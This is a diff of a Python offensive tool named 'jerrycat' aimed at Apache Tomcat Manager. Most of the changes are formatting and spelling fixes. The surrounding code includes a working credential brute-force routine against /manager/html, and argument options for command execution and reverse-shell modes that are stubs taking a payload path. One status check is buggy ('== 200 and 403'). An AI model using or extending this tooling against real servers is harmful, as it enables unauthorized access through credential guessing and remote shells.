@@ -6,9 +6,9 @@ from tqdm import tqdm
 from termcolor import *
 from rich.text import Text
 
+
 # Brute force mode fonction
 def brute(url, userlist, wordlist):
-
     userlist = userlist or 'tomcat'
     # without user list
     if userlist == 'tomcat':
@@ -32,9 +32,8 @@ def brute(url, userlist, wordlist):
                         r = requests.get(f"{url}/manager/html", auth=auth)
                         if r.status_code == 200 and 403:
                             return user, password
-   
-    return False 
 
+    return False
 
 
 def banner():
@@ -43,7 +42,7 @@ def banner():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠞⢛⣩⡽⠿⠛⠛⠷⣄⠀⠀
 ⠀⡷⢶⣶⡶⠶⠤⠤⢤⣄⣀⣀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠈⠙⢿⣶⣄⠀⠀⠀⠀⠀⠀⢀⣴⠟⢉⣤⠾⠋⠁⠀⠀⠀⠀⠀⠘⣷⠀
-⠀⠃⠀⠈⠻⢶⣄⠀⠀⠀⠀⠉⠉⠛⠲⠦⣤⣀⠀⠉⠙⠻⢶⣦⣍⣻⣿⣦⡀⠀⢀⣴⠟⢁⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇
+⠀ ⠀⠈⠻⢶⣄⠀⠀⠀⠀⠉⠉⠛⠲⠦⣤⣀⠀⠉⠙⠻⢶⣦⣍⣻⣿⣦⡀⠀⢀⣴⠟⢁⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇
 ⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢲⣤⣀⣀⣈⣻⣿⣿⠎⠻⣤⠟⠁⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⢀⣠⡴⠶⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿
@@ -53,10 +52,10 @@ def banner():
 ⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⣶⣄⠀⠀⠀⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠈⠛⠀⢰⡄⣶⠀⠀⠀⢀⣤⣶⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⠈⢿⣤⣀⣀⣀⣀⣤⠞⠋⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡶⢦⣄⡈⣷⣿⣀⣠⠶⠋⠻⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⠬⠽⠟⠛⣿⠀⠀⠀⠀⠀⠀⠀⠀
-⠤⢴⠤⣤⣄⣀⣀⣴⣿⠛⠻⢦⣹⢿⣿⣿⣿⣿⣄⠀⢀⣰⠇⠀⣀⣀⣀⣤⣤⠤⠴⠶⠶⢶⠟⠒⠒⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢸⡀⠀⠀⠀⢸⣿⣿⣿⣿⣾⣿⡿⢿⡿⠛⢠⣬⣿⣿⣿⣿⣯⣭⣭⣤⣤⣤⣤⣴⣤⣴⣏⣀⣀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠸⠋⠉⠉⠉⠉⠙⢿⣿⣿⣷⣬⣷⡈⣧⣄⣀⠹⣧⠀⠀⡟⢹⣦⣄⣴⡟⠁⢀⣀⣀⠙⢦⡀⠀⠉⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢀⣼⠋⠉⠉⠛⣿⠿⣯⣿⣯⣗⣼⣷⣦⣿⣿⡿⠿⠾⠿⠿⠭⣍⣉⡉⠛⠻⣦⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀
+⠤⢴⠤⣤⣄⣀⣀⣴⣿⠛⠻⢦⣹⢿⣿⣿⣿⣿⣄⠀⢀⣰⠇⠀⣀⣀⣀⣤⣤⠤⠴⠶⠶⢶⠟⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀  ⠀⠀⠀⢸⣿⣿⣿⣿⣾⣿⡿⢿⡿⠛⢠⣬⣿⣿⣿⣿⣯⣭⣭⣤⣤⣤⣤⣴⣤⣴⣏⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠸⠋⠉⠉⠉⠉⠙⢿⣿⣿⣷⣬⣷⡈⣧⣄⣀⠹⣧⠀⠀⡟⢹⣦⣄⣴⡟⠁⢀⣀⣀⠙⢦⡀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣼⠋⠉⠉⠛⣿⠿⣯⣿⣯⣗⣼⣷⣦⣿⣿⡿⠿⠾⠿⠿⠭⣍⣉⡉⠛⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⢀⣾⡁⠀⠀⠀⢠⡏⢀⡴⠋⠁⠀⠀⠀⢈⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢦⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⣠⡾⣷⠏⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⢿⠷⠤⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -73,13 +72,15 @@ def banner():
 
 
 def main():
-
     parser = argparse.ArgumentParser(description="jerrycat the good guy !")
     group = parser.add_mutually_exclusive_group()
     group.add_argument("-v", "--verbose", action="store_true")
 
     # chose mode
-    parser.add_argument("mode", choices=["brute", "exec", "reverse"], help="Mode: bruteforce, commande, or reverse shell")
+    parser.add_argument("mode", choices=["brute", "exec", "reverse"],
+                        help="Mode: bruteforce, command, or reverse shell")
+
+    # TODO : See if we need to update this option below because -U is already an option? (like --host --ip)
     parser.add_argument('-u', '--url', dest='url', help='url of the tomcat app')
 
     # Brute mode
@@ -88,7 +89,7 @@ def main():
     parser.add_argument('-l', '--user-list', dest='userlist', help='User list ( default tomcat )')
 
     # exec mode
-    exec_mode = parser.add_argument_group("Commande execution Options")
+    exec_mode = parser.add_argument_group("Command execution Options")
     parser.add_argument('-U', '--user', dest='user', help='tomcat user')
     parser.add_argument('-p', '--password', dest='password', help='tomcat user password')
 
@@ -96,14 +97,13 @@ def main():
     reverse_mode = parser.add_argument_group("reverse shell Options")
     reverse_mode.add_argument('-R', '--reverse', dest='reverse', help='path to your reverse shell payload')
 
-
     args = parser.parse_args()
 
     # settings for brute mode
     if args.mode == "brute":
         if not all([args.url, args.wordlist]):
-            parser.error(" -u and -w arguments are requises for this mode.")
-        else :
+            parser.error(" -u and -w arguments are requires for this mode.")
+        else:
             print(banner())
             cprint("[+]", "green", end="")
             print(" Mode Brute selected")
@@ -113,26 +113,27 @@ def main():
             cprint("[*]", "blue", end="")
             print(' Brute force is running...')
             run_bf = brute(url, userlist, passwords)
-            if run_bf == False:
+            if not run_bf:
                 cprint("[-]", "red", end="")
                 print(" No user or password is match ! :(")
-            else :
+            else:
                 cprint("[+]", "green", end="")
-                print(f" find user and password : {run_bf[0]}:{run_bf[1]}") 
+                print(f" find user and password : {run_bf[0]}:{run_bf[1]}")
 
-    # settings for exec mode
+                # settings for exec mode
     elif args.mode == "exec":
         if not all([args.url, args.user, args.password]):
-            parser.error("-u, -U, -p arguments are requises for this mode.")
-        else : 
-            print("Comand execution mode selected")
+            parser.error("-u, -U, -p arguments are requires for this mode.")
+        else:
+            print("Command execution mode selected")
 
     # settings for reverse mode
     elif args.mode == "reverse":
         if not all([args.url, args.user, args.password, args.reverse]):
-            parser.error("-u, -U, -p arguments are requises for this mode.")
+            parser.error("-u, -U, -p arguments are requires for this mode.")
         else:
             print("Reverse shell mode selected")
+
 
 if __name__ == "__main__":
     main()
